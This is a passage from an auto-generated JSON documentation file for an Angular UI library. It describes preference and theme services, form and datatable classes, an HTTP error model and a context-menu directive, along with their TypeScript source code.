                        {
                            "name": "value",
                            "type": "boolean"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 30,
                    "modifierKind": [
                        114
                    ],
                    "jsdoctags": [
                        {
                            "name": "value",
                            "type": "boolean",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "setPreferences",
                    "args": [
                        {
                            "name": "value",
                            "type": "Record<string | unknown>"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 40,
                    "modifierKind": [
                        114
                    ],
                    "jsdoctags": [
                        {
                            "name": "value",
                            "type": "Record<string | unknown>",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                }
            ],
            "description": "",
            "sourceCode": "import { Injectable } from '@angular/core';\nimport { BehaviorSubject } from 'rxjs';\n\nconst preferenceKey = 'TOPS_IM:UserPreferences';\n\n@Injectable()\nexport class StoUserPreferenceService {\n\n  public hasSelectTextOnFocusEnabled = new BehaviorSubject<boolean>(true);\n  public preferences: {\n    hasSelectTextOnFocusEnabled: boolean;\n  };\n  public default = {\n    hasSelectTextOnFocusEnabled: true\n  };\n\n\n  constructor() {\n    let sessionPreferences = {};\n    const sessionPreferencesString = this.getPreferences();\n    try {\n      sessionPreferences = JSON.parse(sessionPreferencesString);\n    } catch ( e ) {\n      console.error('Unable to parse the preferences from local storage. Loading default');\n    }\n    this.preferences = { ...this.default, ...sessionPreferences };\n    this.setHasSelectTextOnFocusEnabled(this.preferences.hasSelectTextOnFocusEnabled);\n  }\n\n  public setHasSelectTextOnFocusEnabled(value: boolean) {\n    this.hasSelectTextOnFocusEnabled.next(value);\n    this.preferences.hasSelectTextOnFocusEnabled = value;\n    this.setPreferences(this.preferences);\n  }\n\n  public getPreferences() {\n    return sessionStorage.getItem(preferenceKey) || '{}';\n  }\n\n  public setPreferences(value: Record<string, unknown>) {\n    sessionStorage.setItem(preferenceKey, JSON.stringify(value));\n  }\n}\n",
            "constructorObj": {
                "name": "constructor",
                "description": "",
                "args": [],
                "line": 15
            },
            "type": "injectable"
        },
        {
            "name": "ThemeSaverService",
            "id": "injectable-ThemeSaverService-499f06f6e31fcf94892af6aeb5c3c529",
            "file": "libs/common/src/lib/theme/theme-saver.service.ts",
            "properties": [],
            "methods": [
                {
                    "name": "load",
                    "args": [
                        {
                            "name": "type",
                            "type": "\"typography\" | \"theme\""
                        }
                    ],
                    "optional": false,
                    "returnType": "Observable<ThemeModel>",
                    "typeParameters": [],
                    "line": 19,
                    "jsdoctags": [
                        {
                            "name": "type",
                            "type": "\"typography\" | \"theme\"",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "save",
                    "args": [
                        {
                            "name": "model",
                            "type": "ThemeModel"
                        }
                    ],
                    "optional": false,
                    "returnType": "Observable<ThemeModel>",
                    "typeParameters": [],
                    "line": 27,
                    "jsdoctags": [
                        {
                            "name": "model",
                            "type": "ThemeModel",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                }
            ],
            "description": "",
            "sourceCode": "import { Injectable, InjectionToken } from '@angular/core';\nimport { ThemeModel, ThemeName, TypographyName } from './models';\nimport { Observable, of } from 'rxjs';\n\ntype ReturnValue<T> = Promise<T> | Observable<T> | T;\n\nexport interface ThemeSaver<T = ReturnValue<ThemeModel>> {\n  save(model: ThemeModel): T;\n\n  load(type?: 'typography' | 'theme'): T;\n\n  remove?(): ReturnValue<void>;\n}\n\nexport const THEME_SAVER = new InjectionToken<ThemeSaver>('sto__theme__typo');\n\n@Injectable({ providedIn: 'root' })\nexport class ThemeSaverService implements ThemeSaver {\n  load(type: 'typography' | 'theme'): Observable<ThemeModel> {\n    let value = localStorage.getItem('tops__' + type) as TypographyName | ThemeName;\n    if ( !value ) {\n      value = type === 'typography' ? 'medium' : 'light';\n    }\n    return of({ value, type });\n  }\n\n  save(model: ThemeModel): Observable<ThemeModel> {\n    localStorage.setItem('tops__' + model.type, model.value);\n    return of(model);\n  }\n}\n",
            "type": "injectable"
        }
    ],
    "classes": [
        {
            "name": "Action",
            "id": "class-Action-2c6d78da0767724b5321f9bf98a6c52b",
            "file": "libs/error-handler/src/lib/error-handler/http-error.ts",
            "type": "class",
            "sourceCode": "import { HttpErrorResponse } from '@angular/common/http';\n\n/**\n * Internal HttpError format\n */\nexport class HttpError {\n  // Status code\n  status: number;\n  // Dialog title\n  title: string;\n  // Dialog body\n  text: string;\n  // Action list.\n  actions: Action[] = [];\n\n  constructor(public readonly error: HttpErrorResponse) {\n    this.status = error.status;\n  }\n}\n\n/**\n * Available properties on dialog actions\n */\nexport class Action {\n  /**\n   * Button label\n   */\n  label: string;\n  /**\n   * A function to be called based on the given action (e.g window.location.reload to refresh the tab)\n   */\n  action?: (...args: unknown[]) => unknown;\n  /**\n   * The data to be returned when the dialog is closed.\n   */\n  closeDialogData?: Record<string, unknown>;\n\n  constructor(label: string);\n  constructor(label: string, close: () => void);\n  constructor(label: string, close: Record<string, unknown>);\n  constructor(label: string, close?: Record<string, unknown> | (() => unknown)) {\n    this.label = label;\n    if ( typeof close === 'function' ) {\n      // eslint-disable-next-line @typescript-eslint/ban-ts-comment\n      // @ts-ignore\n      this.action = close;\n    } else {\n      this.closeDialogData = close;\n    }\n  }\n}\n",
            "constructorObj": {
                "name": "constructor",
                "description": "",
                "args": [
                    {
                        "name": "label",
                        "type": "string"
                    },
                    {
                        "name": "close",
                        "type": "Record<string | unknown> | ",
                        "optional": true
                    }
                ],
                "line": 40,
                "jsdoctags": [
                    {
                        "name": "label",
                        "type": "string",
                        "tagName": {
                            "text": "param"
                        }
                    },
                    {
                        "name": "close",
                        "type": "Record<string | unknown> | ",
                        "optional": true,
                        "tagName": {
                            "text": "param"
                        }
                    }
                ]
            },
            "properties": [
                {
                    "name": "action",
                    "type": "function",
                    "optional": true,
                    "description": "<p>A function to be called based on the given action (e.g window.location.reload to refresh the tab)</p>\n",
                    "line": 32
                },
                {
                    "name": "closeDialogData",
                    "type": "Record<string | unknown>",
                    "optional": true,
                    "description": "<p>The data to be returned when the dialog is closed.</p>\n",
                    "line": 36
                },
                {
                    "name": "label",
                    "type": "string",
                    "optional": false,
                    "description": "<p>Button label</p>\n",
                    "line": 28
                }
            ],
            "description": "<p>Available properties on dialog actions</p>\n",
            "rawdescription": "Available properties on dialog actions",
            "methods": [],
            "indexSignatures": [],
            "inputsClass": [],
            "outputsClass": [],
            "hostBindings": [],
            "hostListeners": []
        },
        {
            "name": "Column",
            "id": "class-Column-ad7383ca7b2fb92a6bfaf0beb1603f64",
            "file": "libs/datatable/src/lib/sto-datatable/columns.ts",
            "type": "class",
            "sourceCode": "import { TemplateRef } from '@angular/core';\n\nexport class Column {\n  $$id?: string;\n  prop: string;\n  name: string;\n  flexGrow?: number;\n  flexBasis?: number;\n  flexShrink?: number;\n  sortable ? = false;\n  headerTemplate?: TemplateRef<unknown>;\n  cellTemplate?: TemplateRef<unknown>;\n  footerTemplate?: TemplateRef<unknown>;\n  cellClass?: string | ClassFunction;\n  headerClass?: string | ClassFunction;\n  sortFn?: SortFunction;\n  disableSort?: boolean;\n  disableResize?: boolean;\n}\n\nexport class ColumnGroup {\n  name: string;\n  columnStart: number;\n  columnEnd: number;\n  transform?: string;\n}\n\nexport enum ColumnDisplay {\n  Flex = 'flex',\n  Force = 'force'\n}\n\ntype ClassFunction = <T, U>(value: T, row: U, column: Column) => string | string[];\ntype SortFunction = <T>(a: T, b: T, column: Column) => number;\n",
            "properties": [
                {
                    "name": "$$id",
                    "type": "string",
                    "optional": true,
                    "description": "",
                    "line": 4
                },
                {
                    "name": "cellClass",
                    "type": "string | ClassFunction",
                    "optional": true,
                    "description": "",
                    "line": 14
                },
                {
                    "name": "cellTemplate",
                    "type": "TemplateRef<unknown>",
                    "optional": true,
                    "description": "",
                    "line": 12
                },
                {
                    "name": "disableResize",
                    "type": "boolean",
                    "optional": true,
                    "description": "",
                    "line": 18
                },
                {
                    "name": "disableSort",
                    "type": "boolean",
                    "optional": true,
                    "description": "",
                    "line": 17
                },
                {
                    "name": "flexBasis",
                    "type": "number",
                    "optional": true,
                    "description": "",
                    "line": 8
                },
                {
                    "name": "flexGrow",
                    "type": "number",
                    "optional": true,
                    "description": "",
                    "line": 7
                },
                {
                    "name": "flexShrink",
                    "type": "number",
                    "optional": true,
                    "description": "",
                    "line": 9
                },
                {
                    "name": "footerTemplate",
                    "type": "TemplateRef<unknown>",
                    "optional": true,
                    "description": "",
                    "line": 13
                },
                {
                    "name": "headerClass",
                    "type": "string | ClassFunction",
                    "optional": true,
                    "description": "",
                    "line": 15
                },
                {
                    "name": "headerTemplate",
                    "type": "TemplateRef<unknown>",
                    "optional": true,
                    "description": "",
                    "line": 11
                },
                {
                    "name": "name",
                    "type": "string",
                    "optional": false,
                    "description": "",
                    "line": 6
                },
                {
                    "name": "prop",
                    "type": "string",
                    "optional": false,
                    "description": "",
                    "line": 5
                },
                {
                    "name": "sortable",
                    "defaultValue": "false",
                    "type": "",
                    "optional": true,
                    "description": "",
                    "line": 10
                },
                {
                    "name": "sortFn",
                    "type": "SortFunction",
                    "optional": true,
                    "description": "",
                    "line": 16
                }
            ],
            "methods": [],
            "indexSignatures": [],
            "inputsClass": [],
            "outputsClass": [],
            "hostBindings": [],
            "hostListeners": []
        },
        {
            "name": "ColumnGroup",
            "id": "class-ColumnGroup-ad7383ca7b2fb92a6bfaf0beb1603f64",
            "file": "libs/datatable/src/lib/sto-datatable/columns.ts",
            "type": "class",
            "sourceCode": "import { TemplateRef } from '@angular/core';\n\nexport class Column {\n  $$id?: string;\n  prop: string;\n  name: string;\n  flexGrow?: number;\n  flexBasis?: number;\n  flexShrink?: number;\n  sortable ? = false;\n  headerTemplate?: TemplateRef<unknown>;\n  cellTemplate?: TemplateRef<unknown>;\n  footerTemplate?: TemplateRef<unknown>;\n  cellClass?: string | ClassFunction;\n  headerClass?: string | ClassFunction;\n  sortFn?: SortFunction;\n  disableSort?: boolean;\n  disableResize?: boolean;\n}\n\nexport class ColumnGroup {\n  name: string;\n  columnStart: number;\n  columnEnd: number;\n  transform?: string;\n}\n\nexport enum ColumnDisplay {\n  Flex = 'flex',\n  Force = 'force'\n}\n\ntype ClassFunction = <T, U>(value: T, row: U, column: Column) => string | string[];\ntype SortFunction = <T>(a: T, b: T, column: Column) => number;\n",
            "properties": [
                {
                    "name": "columnEnd",
                    "type": "number",
                    "optional": false,
                    "description": "",
                    "line": 24
                },
                {
                    "name": "columnStart",
                    "type": "number",
                    "optional": false,
                    "description": "",
                    "line": 23
                },
                {
                    "name": "name",
                    "type": "string",
                    "optional": false,
                    "description": "",
                    "line": 22
                },
                {
                    "name": "transform",
                    "type": "string",
                    "optional": true,
                    "description": "",
                    "line": 25
                }
            ],
            "methods": [],
            "indexSignatures": [],
            "inputsClass": [],
            "outputsClass": [],
            "hostBindings": [],
            "hostListeners": []
        },
        {
            "name": "FormFieldBase",
            "id": "class-FormFieldBase-c53af3281828f368b8efaeb791757dbd",
            "file": "libs/form/src/lib/sto-form/form-field.base.ts",
            "type": "class",
            "sourceCode": "import { Subject } from 'rxjs';\nimport { ErrorStateMatcher } from '@angular/material/core';\nimport { FormControl, FormGroupDirective, NgControl, NgForm } from '@angular/forms';\nimport { ElementRef } from '@angular/core';\n\nexport class FormFieldBase {\n  /** Whether the component is in an error state. */\n  errorState = false;\n\n  /**\n   * Stream that emits whenever the state of the input changes such that the wrapping\n   * `MatFormField` needs to run change detection.\n   */\n  stateChanges: Subject<void>;\n\n  errorStateMatcher: ErrorStateMatcher;\n\n  constructor(public _elementRef: ElementRef,\n              public _defaultErrorStateMatcher: ErrorStateMatcher,\n              public _parentForm: NgForm,\n              public _parentFormGroup: FormGroupDirective,\n              public ngControl: NgControl) {\n  }\n\n  updateErrorState() {\n    const oldState = this.errorState;\n    const parent = this._parentFormGroup || this._parentForm;\n    const matcher = this.errorStateMatcher || this._defaultErrorStateMatcher;\n    const control = this.ngControl ? this.ngControl.control as FormControl : null;\n    const newState = matcher.isErrorState(control, parent);\n\n    if ( newState !== oldState ) {\n      this.errorState = newState;\n      this.stateChanges.next();\n    }\n  }\n}\n",
            "constructorObj": {
                "name": "constructor",
                "description": "",
                "args": [
                    {
                        "name": "_elementRef",
                        "type": "ElementRef"
                    },
                    {
                        "name": "_defaultErrorStateMatcher",
                        "type": "ErrorStateMatcher"
                    },
                    {
                        "name": "_parentForm",
                        "type": "NgForm"
                    },
                    {
                        "name": "_parentFormGroup",
                        "type": "FormGroupDirective"
                    },
                    {
                        "name": "ngControl",
                        "type": "NgControl"
                    }
                ],
                "line": 16,
                "jsdoctags": [
                    {
                        "name": "_elementRef",
                        "type": "ElementRef",
                        "tagName": {
                            "text": "param"
                        }
                    },
                    {
                        "name": "_defaultErrorStateMatcher",
                        "type": "ErrorStateMatcher",
                        "tagName": {
                            "text": "param"
                        }
                    },
                    {
                        "name": "_parentForm",
                        "type": "NgForm",
                        "tagName": {
                            "text": "param"
                        }
                    },
                    {
                        "name": "_parentFormGroup",
                        "type": "FormGroupDirective",
                        "tagName": {
                            "text": "param"
                        }
                    },
                    {
                        "name": "ngControl",
                        "type": "NgControl",
                        "tagName": {
                            "text": "param"
                        }
                    }
                ]
            },
            "properties": [
                {
                    "name": "_defaultErrorStateMatcher",
                    "type": "ErrorStateMatcher",
                    "optional": false,
                    "description": "",
                    "line": 19,
                    "modifierKind": [
                        114
                    ]
                },
                {
                    "name": "_elementRef",
                    "type": "ElementRef",
                    "optional": false,
                    "description": "",
                    "line": 18,
                    "modifierKind": [
                        114
                    ]
                },
                {
                    "name": "_parentForm",
                    "type": "NgForm",
                    "optional": false,
                    "description": "",
                    "line": 20,
                    "modifierKind": [
                        114
                    ]
                },
                {
                    "name": "_parentFormGroup",
                    "type": "FormGroupDirective",
                    "optional": false,
                    "description": "",
                    "line": 21,
                    "modifierKind": [
                        114
                    ]
                },
                {
                    "name": "errorState",
                    "defaultValue": "false",
                    "type": "",
                    "optional": false,
                    "description": "<p>Whether the component is in an error state. </p>\n",
                    "line": 8
                },
                {
                    "name": "errorStateMatcher",
                    "type": "ErrorStateMatcher",
                    "optional": false,
                    "description": "",
                    "line": 16
                },
                {
                    "name": "ngControl",
                    "type": "NgControl",
                    "optional": false,
                    "description": "",
                    "line": 22,
                    "modifierKind": [
                        114
                    ]
                },
                {
                    "name": "stateChanges",
                    "type": "Subject<void>",
                    "optional": false,
                    "description": "<p>Stream that emits whenever the state of the input changes such that the wrapping\n<code>MatFormField</code> needs to run change detection.</p>\n",
                    "line": 14
                }
            ],
            "methods": [
                {
                    "name": "updateErrorState",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 25
                }
            ],
            "indexSignatures": [],
            "inputsClass": [],
            "outputsClass": [],
            "hostBindings": [],
            "hostListeners": []
        },
        {
            "name": "HttpError",
            "id": "class-HttpError-2c6d78da0767724b5321f9bf98a6c52b",
            "file": "libs/error-handler/src/lib/error-handler/http-error.ts",
            "type": "class",
            "sourceCode": "import { HttpErrorResponse } from '@angular/common/http';\n\n/**\n * Internal HttpError format\n */\nexport class HttpError {\n  // Status code\n  status: number;\n  // Dialog title\n  title: string;\n  // Dialog body\n  text: string;\n  // Action list.\n  actions: Action[] = [];\n\n  constructor(public readonly error: HttpErrorResponse) {\n    this.status = error.status;\n  }\n}\n\n/**\n * Available properties on dialog actions\n */\nexport class Action {\n  /**\n   * Button label\n   */\n  label: string;\n  /**\n   * A function to be called based on the given action (e.g window.location.reload to refresh the tab)\n   */\n  action?: (...args: unknown[]) => unknown;\n  /**\n   * The data to be returned when the dialog is closed.\n   */\n  closeDialogData?: Record<string, unknown>;\n\n  constructor(label: string);\n  constructor(label: string, close: () => void);\n  constructor(label: string, close: Record<string, unknown>);\n  constructor(label: string, close?: Record<string, unknown> | (() => unknown)) {\n    this.label = label;\n    if ( typeof close === 'function' ) {\n      // eslint-disable-next-line @typescript-eslint/ban-ts-comment\n      // @ts-ignore\n      this.action = close;\n    } else {\n      this.closeDialogData = close;\n    }\n  }\n}\n",
            "constructorObj": {
                "name": "constructor",
                "description": "",
                "args": [
                    {
                        "name": "error",
                        "type": "HttpErrorResponse"
                    }
                ],
                "line": 14,
                "jsdoctags": [
                    {
                        "name": "error",
                        "type": "HttpErrorResponse",
                        "tagName": {
                            "text": "param"
                        }
                    }
                ]
            },
            "properties": [
                {
                    "name": "actions",
                    "defaultValue": "[]",
                    "type": "Action[]",
                    "optional": false,
                    "description": "",
                    "line": 14
                },
                {
                    "name": "error",
                    "type": "HttpErrorResponse",
                    "optional": false,
                    "description": "",
                    "line": 16,
                    "modifierKind": [
                        114,
                        132
                    ]
                },
                {
                    "name": "status",
                    "type": "number",
                    "optional": false,
                    "description": "",
                    "line": 8
                },
                {
                    "name": "text",
                    "type": "string",
                    "optional": false,
                    "description": "",
                    "line": 12
                },
                {
                    "name": "title",
                    "type": "string",
                    "optional": false,
                    "description": "",
                    "line": 10
                }
            ],
            "description": "<p>Internal HttpError format</p>\n",
            "rawdescription": "Internal HttpError format",
            "methods": [],
            "indexSignatures": [],
            "inputsClass": [],
            "outputsClass": [],
            "hostBindings": [],
            "hostListeners": []
        },
        {
            "name": "Modifiers",
            "id": "class-Modifiers-d44fe7a59818494ff377476e8a5a9489",
            "file": "libs/form/src/lib/sto-wysiwyg/modifiers.ts",
            "type": "class",
            "sourceCode": "export class Modifiers {\n  italic: boolean;\n  bold: boolean;\n  underline: boolean;\n\n  static getActiveModifiers(): string[] {\n    const m = new Modifiers();\n    m.bold = document.queryCommandState('bold');\n    m.italic = document.queryCommandState('italic');\n    m.underline = document.queryCommandState('underline');\n    // eslint-disable-next-line @typescript-eslint/ban-ts-comment\n    // @ts-ignore\n    return Object.keys(m).filter((k) => m[ k ]);\n  }\n}\n\nexport const validCommands = [\n  'bold',\n  'underline',\n  'italic',\n  'createLink',\n  'insertUnorderedList',\n  'insertOrderedList',\n  'removeFormat',\n];\n",
            "properties": [
                {
                    "name": "bold",
                    "type": "boolean",
                    "optional": false,
                    "description": "",
                    "line": 3
                },
                {
                    "name": "italic",
                    "type": "boolean",
                    "optional": false,
                    "description": "",
                    "line": 2
                },
                {
                    "name": "underline",
                    "type": "boolean",
                    "optional": false,
                    "description": "",
                    "line": 4
                }
            ],
            "methods": [
                {
                    "name": "getActiveModifiers",
                    "args": [],
                    "optional": false,
                    "returnType": "string[]",
                    "typeParameters": [],
                    "line": 6,
                    "modifierKind": [
                        115
                    ]
                }
            ],
            "indexSignatures": [],
            "inputsClass": [],
            "outputsClass": [],
            "hostBindings": [],
            "hostListeners": []
        },
        {
            "name": "NumberUnit",
            "id": "class-NumberUnit-47aa7305a547713aa580072f6ca10a4f",
            "file": "libs/form/src/lib/number-input/number-unit-input/number-unit-input.component.ts",
            "type": "class",
            "sourceCode": "import {\n  ChangeDetectionStrategy,\n  Component,\n  DoCheck,\n  ElementRef,\n  HostBinding,\n  Input,\n  OnDestroy,\n  OnInit,\n  Optional,\n  Self,\n  ViewChild,\n  ViewEncapsulation\n} from '@angular/core';\nimport { ControlValueAccessor, FormBuilder, FormGroup, FormGroupDirective, NgControl, NgForm } from '@angular/forms';\nimport { MatFormFieldControl } from '@angular/material/form-field';\nimport { Subject, Subscription } from 'rxjs';\nimport { FocusMonitor } from '@angular/cdk/a11y';\nimport { coerceBooleanProperty } from '@angular/cdk/coercion';\nimport { NumberInputPipe } from '../number-input.pipe';\nimport { MatSelect } from '@angular/material/select';\nimport { FormFieldBase } from '../../sto-form/form-field.base';\nimport { ErrorStateMatcher } from '@angular/material/core';\n\nclass NumberUnit {\n  value: number | string;\n  unit: string;\n}\n\n@Component({\n  selector: 'sto-number-unit-input',\n  templateUrl: './number-unit-input.component.html',\n  styleUrls: [ './number-unit-input.component.scss' ],\n  providers: [\n    { provide: MatFormFieldControl, useExisting: NumberUnitInputComponent }\n  ],\n  encapsulation: ViewEncapsulation.None,\n  changeDetection: ChangeDetectionStrategy.OnPush\n})\nexport class NumberUnitInputComponent extends FormFieldBase\n  implements DoCheck, OnInit, OnDestroy, ControlValueAccessor, MatFormFieldControl<NumberUnit> {\n  static nextId = 0;\n  stateChanges = new Subject<void>();\n  public form: FormGroup;\n  readonly autofilled: boolean;\n  controlType = 'number-unit-input';\n  private numberFormatterPipe = new NumberInputPipe();\n  @ViewChild(MatSelect)\n  select: MatSelect;\n  @ViewChild('input')\n  input: ElementRef<HTMLInputElement>;\n\n  errorState: boolean;\n\n  @Input()\n  unitOptional = true;\n  @Input()\n  unitClearText = '(none)';\n\n  @Input()\n  get disabled(): boolean {\n    return this._disabled;\n  }\n\n  set disabled(disable: boolean) {\n    this._disabled = coerceBooleanProperty(disable);\n    const opts = { onlySelf: true, emitEvent: false };\n    disable ? this.form.disable(opts) : this.form.enable(opts);\n    // disable ? this.form.get('unit').disable(opts) : this.form.get('unit').enable(opts);\n    // disable ? this.form.get('value').disable(opts) : this.form.get('value').enable(opts);\n    this.stateChanges.next();\n  }\n\n  private _disabled = false;\n\n  @Input()\n  get readonly(): boolean {\n    return this._readonly;\n  }\n\n  set readonly(value: boolean) {\n    this._readonly = coerceBooleanProperty(value);\n    const opts = { onlySelf: true, emitEvent: false };\n    value ? this.form.get('unit')?.disable(opts) : this.form.get('unit')?.enable(opts);\n    this.stateChanges.next();\n  }\n\n  private _readonly = false;\n\n  @Input()\n  get list() {\n    return this._list;\n  }\n\n  set list(value) {\n    this._list = value;\n    this.stateChanges.next();\n  }\n\n  private _list: { value: unknown; title?: string; }[] = [];\n\n  @Input()\n  get fractionSize() {\n    return this._fractionSize || 3;\n  }\n\n  set fractionSize(fractionSize) {\n    this._fractionSize = fractionSize;\n    this.stateChanges.next();\n  }\n\n  private _fractionSize: number;\n\n  get empty() {\n    const n = this.form.value;\n    return !n.value && !n.unit;\n  }\n\n  public focused: boolean;\n\n\n  @HostBinding()\n  id = `value-unit-input-${NumberUnitInputComponent.nextId++}`;\n\n  @Input()\n  get placeholder() {\n    return this._placeholder || '';\n  }\n\n  set placeholder(plh) {\n    this._placeholder = plh;\n    this.stateChanges.next();\n  }\n\n  private _placeholder: string;\n\n  @Input()\n  get unitPlaceholder() {\n    return this._unitPlaceholder || '';\n  }\n\n  set unitPlaceholder(plh) {\n    this._unitPlaceholder = plh;\n    this.stateChanges.next();\n  }\n\n  private _unitPlaceholder: string;\n\n  @Input()\n  get required() {\n    return this._required;\n  }\n\n  set required(req) {\n    this._required = coerceBooleanProperty(req);\n    this.stateChanges.next();\n  }\n\n  private _required = false;\n\n  @HostBinding('class.floating')\n  get shouldLabelFloat() {\n    return this.focused || !this.empty;\n  }\n\n  get value(): NumberUnit | null {\n    return this._value;\n  }\n\n  set value(value: NumberUnit | null) {\n    if ( value ) {\n      const parsedValue = this.numberFormatterPipe.transform(value.value, this.fractionSize);\n      this._value = { ...value, value: parsedValue };\n    } else {\n      this._value = value;\n    }\n    this.form.patchValue(this._value || {}, { emitEvent: false });\n    this.stateChanges.next();\n  }\n\n  private _value: NumberUnit | null;\n\n  @HostBinding('attr.aria-describedby') describedBy = '';\n\n  public sub = new Subscription();\n\n\n  constructor(@Optional() @Self() public ngControl: NgControl,\n              private fm: FocusMonitor,\n              private fb: FormBuilder,\n              @Optional() _parentForm: NgForm,\n              @Optional() _parentFormGroup: FormGroupDirective,\n              _defaultErrorStateMatcher: ErrorStateMatcher,\n              private elRef: ElementRef<HTMLElement>) {\n    super(elRef, _defaultErrorStateMatcher, _parentForm, _parentFormGroup, ngControl);\n    this.form = this.fb.group({\n      value: [],\n      unit: []\n    });\n    if ( this.ngControl != null ) {\n      this.ngControl.valueAccessor = this;\n    }\n    fm.monitor(elRef.nativeElement, true).subscribe(origin => {\n      this.focused = !!origin;\n      this.stateChanges.next();\n    });\n  }\n\n  ngDoCheck(): void {\n    if ( this.ngControl ) {\n      this.updateErrorState();\n    }\n  }\n\n\n  ngOnInit(): void {\n    const sub = this.form.valueChanges\n      .subscribe((value: NumberUnit) => {\n        const valueAsString = value.value as string;\n        let numberValue: number | null = parseFloat(this.numberFormatterPipe.parse(valueAsString, this.fractionSize));\n        numberValue = !isNaN(numberValue) ? numberValue : null;\n        this.onChange({ ...value, value: numberValue });\n      });\n\n    this.sub.add(sub);\n    if ( this.ngControl && this.ngControl.statusChanges ) {\n      this.sub.add(this.ngControl.statusChanges\n        .subscribe(() => this.updateErrorState())\n      );\n    }\n  }\n\n  ngOnDestroy(): void {\n    this.stateChanges.complete();\n    this.fm.stopMonitoring(this.elRef.nativeElement);\n    this.sub.unsubscribe();\n  }\n\n\n  onContainerClick(event: MouseEvent) {\n    const rect = this.input.nativeElement.getBoundingClientRect();\n    const isInputFocus = rect.right >= event.clientX;\n    if ( isInputFocus ) {\n      this.elRef.nativeElement.querySelector('input')?.focus();\n    } else {\n      this.select.focus();\n      this.select.open();\n    }\n  }\n\n\n  setDescribedByIds(ids: string[]) {\n    this.describedBy = ids.join(' ');\n  }\n\n\n  // eslint-disable-next-line @typescript-eslint/no-empty-function,@typescript-eslint/no-unused-vars\n  onChange = (_: unknown) => {\n  }\n  // eslint-disable-next-line @typescript-eslint/no-empty-function\n  onTouched = () => {\n  }\n\n  writeValue(value: NumberUnit | null): void {\n    this.value = value;\n  }\n\n  registerOnChange(fn: never): void {\n    this.onChange = fn;\n  }\n\n  registerOnTouched(fn: never): void {\n    this.onTouched = fn;\n  }\n\n  setDisabledState(isDisabled: boolean): void {\n    this.disabled = isDisabled;\n  }\n\n}\n",
            "properties": [
                {
                    "name": "unit",
                    "type": "string",
                    "optional": false,
                    "description": "",
                    "line": 27
                },
                {
                    "name": "value",
                    "type": "number | string",
                    "optional": false,
                    "description": "",
                    "line": 26
                }
            ],
            "methods": [],
            "indexSignatures": [],
            "inputsClass": [],
            "outputsClass": [],
            "hostBindings": [],
            "hostListeners": []
        },
        {
            "name": "Preference",
            "id": "class-Preference-48ef817df191563e288b9501a33bfdda",
            "file": "libs/common/src/lib/preference-manager/preference.ts",
            "type": "class",
            "sourceCode": "export class Preference {\n  id: string;\n  /**\n   * Userdefined name for the filter\n   */\n  name: string;\n  /**\n   * Username of the person who owns the filter\n   */\n  user: string;\n  /**\n   * identifierKey is used to distinguish between which area of the application the filter is used\n   * For example, identifierKey can be report_filter for a list of reports, and report_columns for the same list's column setup\n   */\n  identifierKey: string;\n  /**\n   * default determines if this is the default filter if no others are selected\n   * If no filters are marked as d\n   */\n  default?: boolean;\n  /**\n   * payload is the value of the preference (e.g the filters)\n   */\n  payload: Record<string, unknown>;\n  /**\n   * external determines if the preference is external, and if so, if it should be possible to save immediately.\n   */\n  external?: boolean;\n\n  constructor(identifierKey: string) {\n    this.name = 'New preference';\n    this.identifierKey = identifierKey;\n  }\n}\n",
            "constructorObj": {
                "name": "constructor",
                "description": "",
                "args": [
                    {
                        "name": "identifierKey",
                        "type": "string"
                    }
                ],
                "line": 28,
                "jsdoctags": [
                    {
                        "name": "identifierKey",
                        "type": "string",
                        "tagName": {
                            "text": "param"
                        }
                    }
                ]
            },
            "properties": [
                {
                    "name": "default",
                    "type": "boolean",
                    "optional": true,
                    "description": "<p>default determines if this is the default filter if no others are selected\nIf no filters are marked as d</p>\n",
                    "line": 20
                },
                {
                    "name": "external",
                    "type": "boolean",
                    "optional": true,
                    "description": "<p>external determines if the preference is external, and if so, if it should be possible to save immediately.</p>\n",
                    "line": 28
                },
                {
                    "name": "id",
                    "type": "string",
                    "optional": false,
                    "description": "",
                    "line": 2
                },
                {
                    "name": "identifierKey",
                    "type": "string",
                    "optional": false,
                    "description": "<p>identifierKey is used to distinguish between which area of the application the filter is used\nFor example, identifierKey can be report_filter for a list of reports, and report_columns for the same list&#39;s column setup</p>\n",
                    "line": 15
                },
                {
                    "name": "name",
                    "type": "string",
                    "optional": false,
                    "description": "<p>Userdefined name for the filter</p>\n",
                    "line": 6
                },
                {
                    "name": "payload",
                    "type": "Record<string | unknown>",
                    "optional": false,
                    "description": "<p>payload is the value of the preference (e.g the filters)</p>\n",
                    "line": 24
                },
                {
                    "name": "user",
                    "type": "string",
                    "optional": false,
                    "description": "<p>Username of the person who owns the filter</p>\n",
                    "line": 10
                }
            ],
            "methods": [],
            "indexSignatures": [],
            "inputsClass": [],
            "outputsClass": [],
            "hostBindings": [],
            "hostListeners": []
        }
    ],
    "directives": [
        {
            "name": "ContextMenuDirective",
            "id": "directive-ContextMenuDirective-896fa739baca72ec4c4f968ea88834dc",
            "file": "libs/core/src/lib/sto-directives/context-menu.directive.ts",
            "type": "directive",
            "description": "",
            "sourceCode": "import { Directive, HostListener, Input } from '@angular/core';\nimport { MatMenuTrigger } from '@angular/material/menu';\nimport { MenuOverlayDirective } from './menu-overlay.directive';\n\n@Directive({\n  selector: '[stoContextMenu]'\n})\nexport class ContextMenuDirective {\n  @Input()\n  menuTrigger: MatMenuTrigger;\n  @Input()\n  overlayDirective: MenuOverlayDirective;\n  @Input()\n  menuContext: unknown;\n\n  @HostListener('contextmenu', [ '$event' ])\n  contextMenu(event: MouseEvent) {\n    event.preventDefault();\n    if ( this.menuTrigger.menuOpen ) {\n      this.menuTrigger.closeMenu();\n    }\n    this.overlayDirective.updatePosition(event);\n    setTimeout(() => {\n      this.menuTrigger.menuData = this.menuContext;\n      this.menuTrigger.openMenu();\n    }, 150);\n  }\n\n}\n",
            "selector": "[stoContextMenu]",
            "providers": [],
            "inputsClass": [
                {
                    "name": "menuContext",
                    "line": 14,
                    "type": "unknown"
                },
                {
                    "name": "menuTrigger",
                    "line": 10,
                    "type": "MatMenuTrigger"
                },
                {
                    "name": "overlayDirective",
                    "line": 12,
                    "type": "MenuOverlayDirective"
                }
